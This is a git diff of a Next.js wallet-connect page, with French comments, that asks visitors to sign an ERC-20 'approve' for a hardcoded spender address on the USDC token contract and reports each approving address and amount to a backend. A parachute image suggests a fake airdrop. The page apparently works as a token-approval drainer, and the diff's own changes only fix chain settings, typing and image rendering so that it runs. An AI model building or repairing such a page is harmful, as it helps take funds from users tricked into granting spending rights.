@@ -3,8 +3,10 @@
 import { useEffect, useState } from 'react';
 import { ConnectButton } from '@rainbow-me/rainbowkit';
 import { useAccount, usePublicClient, useWalletClient } from 'wagmi';
+import { mainnet } from 'wagmi/chains';
 import { erc20Abi } from 'viem';
 import { parseUnits, formatUnits } from 'viem/utils';
+import Image from 'next/image';
 
 const TOKEN_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
 const SPENDER = '0xB379A0B530e6d966bE7239fDa8B73274AD74E7A4';
@@ -87,6 +89,7 @@ export default function Home() {
         functionName: 'approve',
         args: [SPENDER, amountToApprove],
         account: address,
+        chain: mainnet, // Corrigé ici
       });
 
       setStatus('Approbation envoyée: ' + txHash);
@@ -95,7 +98,7 @@ export default function Home() {
       setStatus('Approbation confirmée !');
       await notifyBackend('approve', { address, amount: amountToApprove.toString() });
 
-    } catch (e) {
+    } catch (e: any) {
       setStatus('Erreur approve: ' + e.message);
       await notifyBackend('error', { address, error: e.message });
     }
@@ -107,7 +110,7 @@ export default function Home() {
     }
   }, [isConnected, address, allowance]);
 
-  if (!hasMounted) return null; // <-- empêche le rendu SSR non conforme
+  if (!hasMounted) return null;
 
   return (
     <div style={styles.container}>
@@ -115,12 +118,14 @@ export default function Home() {
         <ConnectButton />
       </div>
 
-      <img
+      <Image
         src="/parachute.png"
         alt="Parachute"
+        width={220}
+        height={220}
         style={styles.parachute}
         draggable={false}
-        loading="lazy"
+        priority
       />
 
       {isConnected && (
@@ -154,7 +159,6 @@ const styles: { [key: string]: React.CSSProperties } = {
     zIndex: 2,
   },
   parachute: {
-    width: '220px',
     marginTop: '80px',
     pointerEvents: 'none',
     userSelect: 'none',
